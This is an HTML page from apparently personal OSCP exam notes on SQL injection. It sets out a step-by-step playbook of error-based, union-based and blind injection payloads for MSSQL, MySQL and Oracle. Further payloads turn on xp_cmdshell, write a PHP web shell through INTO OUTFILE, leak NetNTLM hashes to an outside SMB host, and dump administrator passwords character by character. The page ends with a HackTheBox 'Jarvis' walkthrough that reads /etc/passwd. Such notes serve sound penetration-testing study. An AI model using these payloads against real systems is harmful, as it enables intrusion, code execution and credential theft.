@@ -1,0 +1,718 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>More SQL - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">2.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">2.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">2.3.</strong> File Transfer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AddnlFileTrasnfer.html"><strong aria-hidden="true">2.3.1.</strong> Additional File Transfer</a></li></ol></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">2.4.</strong> Ports</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SSHKeys.html"><strong aria-hidden="true">2.4.1.</strong> SSH Keys</a></li></ol></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">2.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">3.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Impacket.html"><strong aria-hidden="true">3.2.</strong> Impacket</a></li><li class="chapter-item expanded "><a href="RDPEXploit.html"><strong aria-hidden="true">3.3.</strong> RDP Exploits</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">3.4.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">3.5.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">3.5.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">3.5.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">3.6.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="CMSs.html"><strong aria-hidden="true">3.7.</strong> CMSs</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">3.8.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html"><strong aria-hidden="true">3.9.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">3.9.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">3.9.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">3.9.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">3.10.</strong> LFI/RFI</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LFIRFIMore.html"><strong aria-hidden="true">3.10.1.</strong> LFIRFI_More</a></li></ol></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">3.11.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">3.12.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">3.13.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MoreSQL.html" class="active"><strong aria-hidden="true">3.13.1.</strong> More SQL</a></li><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">3.13.2.</strong> PSQL</a></li><li class="chapter-item expanded "><a href="MyMySql.html"><strong aria-hidden="true">3.13.3.</strong> MySQL</a></li><li class="chapter-item expanded "><a href="MSSQL.html"><strong aria-hidden="true">3.13.4.</strong> MSSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">3.14.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">3.15.</strong> XXE_XSS_Deserialization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="XXMore.html"><strong aria-hidden="true">3.15.1.</strong> XSS_More</a></li><li class="chapter-item expanded "><a href="XXXEMore.html"><strong aria-hidden="true">3.15.2.</strong> XXE More</a></li><li class="chapter-item expanded "><a href="CSRF.html"><strong aria-hidden="true">3.15.3.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="SSRF.html"><strong aria-hidden="true">3.15.4.</strong> SSRF</a></li></ol></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">3.16.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENLinNotes.html"><strong aria-hidden="true">4.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">5.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">5.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENWinNotes.html"><strong aria-hidden="true">5.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">6.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">6.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">6.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">6.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">6.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">6.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">6.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">6.8.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h3 id="sql-injections"><a class="header" href="#sql-injections">SQL Injections</a></h3>
+<h1 id="intro"><a class="header" href="#intro">Intro</a></h1>
+<hr />
+<h2 id="classes"><a class="header" href="#classes">Classes</a></h2>
+<ul>
+<li><strong>INBOUND</strong>
+<blockquote>
+<p>data is extracted using the same channel that is used to inject the SQL code.</p>
+</blockquote>
+</li>
+<li><strong>OUT OF BAND</strong>
+<blockquote>
+<p>data is retrieved using a different channel</p>
+</blockquote>
+</li>
+<li><strong>INFERENTIAL</strong>
+<blockquote>
+<p>there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behaviour</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="types"><a class="header" href="#types">Types</a></h2>
+<ul>
+<li><strong>Error-based</strong>
+<blockquote>
+<p>the webpage show us an error</p>
+</blockquote>
+</li>
+<li><strong>Union-based</strong>
+<blockquote>
+<p>The SQL UNION is used to combine the results of two or more SELECT SQL statements into a single result.</p>
+</blockquote>
+</li>
+<li><strong>Blind-sql-injection</strong>
+<blockquote>
+<p>check with time or different information showing</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="methodology"><a class="header" href="#methodology">methodology</a></h2>
+<ol>
+<li>Identify injection and Injection type (with strings use ‘ with numbers dont)</li>
+<li>Attack Error based</li>
+<li>Attack Union based</li>
+<li>Attack Blind</li>
+</ol>
+<h1 id="1-error-based-sql"><a class="header" href="#1-error-based-sql">1 Error based SQL</a></h1>
+<hr />
+<h2 id="case-1-mssql"><a class="header" href="#case-1-mssql">case 1 MSSQL</a></h2>
+<pre><code>http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
+</code></pre>
+<ul>
+<li>
+<p>respuesta</p>
+<pre><code>Syntax error converting the nvarchar value 'nombre_de_usuario' to a column of data type int
+</code></pre>
+<p>Grab the database user with USER Grab the database name with DB_NAME Grab the servername with @@servername Grab the Windows/OS version with @@version</p>
+</li>
+</ul>
+<h2 id="case-2-mssql"><a class="header" href="#case-2-mssql">Case 2 MSSQL</a></h2>
+<p>https://www.exploit-db.com/papers/12975/</p>
+<ul>
+<li>
+<p>Enumerate column and table name</p>
+<pre><code>http://www.example.com/page.asp?id=1' HAVING 1=1--
+Error message: Column 'news.news_id' is invalid                 &lt; table_name.column
+</code></pre>
+<pre><code>http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
+Error message: Column 'news.news_author' is invalid           &lt; table_name.column2
+</code></pre>
+<pre><code>http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
+Error message: Column 'news.news_detail' is invalid             &lt; table_name.column3
+</code></pre>
+<p>Until no error</p>
+</li>
+<li>
+<p>Enumerate version, db name, users:</p>
+<pre><code>http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
+http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
+http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       &lt;&lt; Is the user running as dbo or sa?
+</code></pre>
+<pre><code>xp_cmdshell &lt;&lt; if running as database admin
+http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
+'; exec master.dbo.xp_cmdshell 'command'
+</code></pre>
+</li>
+</ul>
+<p>On MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;--
+RECONFIGURE;--
+EXEC sp_configure 'xp_cmdshell', 1;--
+RECONFIGURE;--  
+</code></pre>
+<p>On MSSQL 2000:</p>
+<pre><code>EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
+</code></pre>
+<h1 id="2-union-based-sqli"><a class="header" href="#2-union-based-sqli">2 Union based SQLI</a></h1>
+<hr />
+<h2 id="case-1-mssql-1"><a class="header" href="#case-1-mssql-1">case 1 MSSQL</a></h2>
+<p>Example :192.168.30.35/comment.php?id=437</p>
+<pre><code>?id=738 order by 1
+?id=738 order by 2
+?id=738 order by n
+hasta que aparece un error " unkown column 7 in order clause"
+</code></pre>
+<p>ex 2</p>
+<pre><code>?id=738 union select 1,2,3,4,5,6
+</code></pre>
+<p>ex 3</p>
+<pre><code>?id=-1 union select 1,2,3,4,@@version,6
+?id=-1 union select 1,2,3,4,user(),6
+</code></pre>
+<p>ex 4</p>
+<pre><code>?id=-1 union select 1,2,3,4,table_name,6 FROM information_schema tables
+</code></pre>
+<p>then</p>
+<pre><code>?id=-1 union all select 1,2,3,4,column_name,6 FROM information_schema columns where table_name='users'
+esto nos devuelve que hay 4 columnas, id name password y country
+</code></pre>
+<p>then</p>
+<pre><code>id=-1 union select 1,2,name,4,password,6 FROM users
+</code></pre>
+<h2 id="case-2-mysql"><a class="header" href="#case-2-mysql">case 2 MySQL</a></h2>
+<ul>
+<li>
+<p>enumerate columns</p>
+<pre><code>http://[site]/page.php?id=1 order by 1/*
+http://[site]/page.php?id=1 order by 2/*
+http://[site]/page.php?id=1 order by 5/*
+5 gives a valid page
+</code></pre>
+</li>
+<li>
+<p>union</p>
+<pre><code>http://[site]/page.php?id=1 union all select 1,2,3,4,5/
+gives a valid page
+</code></pre>
+<p>Change the first part of the query to a null or negative value so we can see</p>
+<pre><code>http://[site]/page.php?id=-1 union all select 1,2,3,4,5/*
+prints only 2 and 3
+</code></pre>
+</li>
+<li>
+<p>grab info</p>
+<pre><code>http://[site]/page.php?id=null union all select 1,user(),3,4,5/*
+http://[site]/page.php?id=null union all select 1,2,database(),4,5/*
+http://[site]/page.php?id=null union all select 1,@@version,@@datadir,4,5/*
+</code></pre>
+</li>
+</ul>
+<h1 id="3-blind-sqli"><a class="header" href="#3-blind-sqli">3 Blind SQLi</a></h1>
+<hr />
+<h2 id="case-1-mssql-2"><a class="header" href="#case-1-mssql-2">case 1 MSSQL</a></h2>
+<pre><code>http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
+...
+etc until we wait for 10 secs
+</code></pre>
+<ul>
+<li>
+<p>to extract the user name:</p>
+<pre><code>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;97) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;98) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--
+hangs for 10 seconds
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))&gt;97) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+hangs for 10 seconds
+</code></pre>
+<p>and so on</p>
+</li>
+</ul>
+<p>we can try</p>
+<pre><code>id=738-sleep(5)  &lt;-si vemos que tarda es por que el input es injectable
+select IF(MID(@@version,1,1) = '5',SLEEP(5),0)
+</code></pre>
+<p>We can also try with an and to see if it brings results or not</p>
+<pre><code>id=6 and 1=1
+id=6 and 1=2
+</code></pre>
+<p>We ASSUME it is injectable and look for a file with load_file</p>
+<pre><code>id=738 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+</code></pre>
+<p>We create a php</p>
+<pre><code>id=738 union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd'];?&gt;",6 into OUTFILE'c:/xampp/htdocs/backdoor.php'
+</code></pre>
+<p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective</p>
+<h2 id="exploiting-blind-sql-injection-by-triggering-conditional-responses"><a class="header" href="#exploiting-blind-sql-injection-by-triggering-conditional-responses">Exploiting blind SQL injection by triggering conditional responses</a></h2>
+<p>Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:</p>
+<p>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</p>
+<p>When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:</p>
+<pre><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+</code></pre>
+<p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized TrackingId was submitted), then a “Welcome back” message is displayed within the page.</p>
+<pre><code>xyz' UNION SELECT 'a' WHERE 1=1-- &lt;&lt; shows welcome back
+xyz' UNION SELECT 'a' WHERE 1=2--  &lt;&lt; shows nothing
+</code></pre>
+<p>try to gues the password for Administrator:</p>
+<pre><code>xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 'm'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 't'--
+</code></pre>
+<p>We can continue this process to systematically determine the full password for the Administrator user.</p>
+<h2 id="inducing-conditional-responses-by-triggering-sql-errors"><a class="header" href="#inducing-conditional-responses-by-triggering-sql-errors">Inducing conditional responses by triggering SQL errors</a></h2>
+<p>To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:</p>
+<pre><code>xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
+xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
+</code></pre>
+<p>These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the case expression evaluates to NULL, which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application’s HTTP response, we can use this difference to infer whether the injected condition is true.</p>
+<p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p>
+<pre><code>xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) &gt; 'm') then 1/0 else null end from users—
+</code></pre>
+<h2 id="exploiting-blind-sql-injection-by-triggering-time-delays"><a class="header" href="#exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting blind SQL injection by triggering time delays</a></h2>
+<pre><code>'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+</code></pre>
+<ul>
+<li>
+<p>attack</p>
+<pre><code>'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'—
+</code></pre>
+</li>
+</ul>
+<h1 id="mssql-capture-and-crack-netntlm-hash"><a class="header" href="#mssql-capture-and-crack-netntlm-hash">mssql Capture and crack NetNTLM hash</a></h1>
+<hr />
+<p>the MSSQL Server service account can be made to initiate a remote SMB connection using the command below.</p>
+<pre><code>'+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
+</code></pre>
+<p>If we run respond on 10.10.14.9 we will paste hashes</p>
+<h1 id="sql-filter-bypass"><a class="header" href="#sql-filter-bypass">SQL filter bypass</a></h1>
+<hr />
+<p>Beyond SQLi: Obfuscate and Bypass - https://www.exploit-db.com/papers/17934/</p>
+<p>AND, OR operators AND = &amp;&amp; OR = ||</p>
+<p>Comment operator « Mysql</p>
+<pre><code>--  	
+#  
+/**/  
+</code></pre>
+<h3 id="retrieving-multiple-values-within-a-single-column-string-concatenation"><a class="header" href="#retrieving-multiple-values-within-a-single-column-string-concatenation">Retrieving multiple values within a single column STRING CONCATENATION</a></h3>
+<p>In the preceding example, suppose instead that the query only returns a single column.</p>
+<p>You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:</p>
+<pre><code>' UNION SELECT username || '~' || password FROM users--
+</code></pre>
+<p>This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.</p>
+<h2 id="examining-the-database-in-sql-injection-attacks"><a class="header" href="#examining-the-database-in-sql-injection-attacks">Examining the database in SQL injection attacks</a></h2>
+<h3 id="oracle"><a class="header" href="#oracle">ORACLE</a></h3>
+<p>On Oracle, you can obtain the same information with slightly different queries.</p>
+<p>You can list tables by querying all_tables:</p>
+<p>SELECT * FROM all_tables</p>
+<p>And you can list columns by querying all_tab_columns:</p>
+<p>SELECT * FROM all_tab_columns WHERE table_name = ‘USERS’</p>
+<h1 id="jarvis-case-blind-sqli"><a class="header" href="#jarvis-case-blind-sqli">JARVIS CASE BLIND SQLI</a></h1>
+<hr />
+<h2 id="identifing"><a class="header" href="#identifing">identifing</a></h2>
+<p>We detect it with:</p>
+<pre><code>http://jarvis.htb/room.php?cod=6 and 1=1
+http://jarvis.htb/room.php?cod=6 and 1=2
+</code></pre>
+<h2 id="enumeration"><a class="header" href="#enumeration">enumeration</a></h2>
+<pre><code>jarvis.htb/room.php?cod=6 order by 1
+jarvis.htb/room.php?cod=6 order by 7
+jarvis.htb/room.php?cod=6 order by 8 &gt; error
+</code></pre>
+<ul>
+<li>we check what types are allowed</li>
+</ul>
+<pre><code>/room.php?cod=6 UNION SELECT 'a','a','a','a','a','a','a'
+/room.php?cod=6 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+jarvis.htb/room.php?cod=6 UNION SELECT 1,2,3,4,5,6,7
+</code></pre>
+<ul>
+<li>
+<p>show results we use -1 to show us the numbers elsewhere</p>
+<pre><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7
+</code></pre>
+</li>
+</ul>
+<p>it shows us 2,3,4,5</p>
+<ul>
+<li>
+<p>we try to see the version in one of the printable fields</p>
+<pre><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,@@verion,3,4,5,6,7
+</code></pre>
+</li>
+<li>
+<p>we continue listing</p>
+</li>
+<li>
+<p>user, hostname , db</p>
+</li>
+</ul>
+<pre><code>http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,user(),@@hostname,5,6,7
+
+user = DBadmin@localhost
+hostname = jarvis
+database() = HOTEL
+</code></pre>
+<ul>
+<li>schema</li>
+</ul>
+<pre><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT3,1),3,4,5,6,7
+</code></pre>
+<ul>
+<li>lfi</li>
+</ul>
+<pre><code>http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,LOAD_FILE(%22/etc/passwd%22),4,5,NULL,NULL
+
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+
+</code></pre>
+<ul>
+<li>lfi 2</li>
+</ul>
+<pre><code>/var/www/html/index.php
+
+&lt;?php
+          error_reporting(0);
+          include("connection.php");
+          include("roomobj.php");
+          $result=$connection-&gt;query("select * from room");
+          while($line=mysqli_fetch_array($result)){
+            $room=new Room();
+            $room-&gt;cod=$line['cod'];
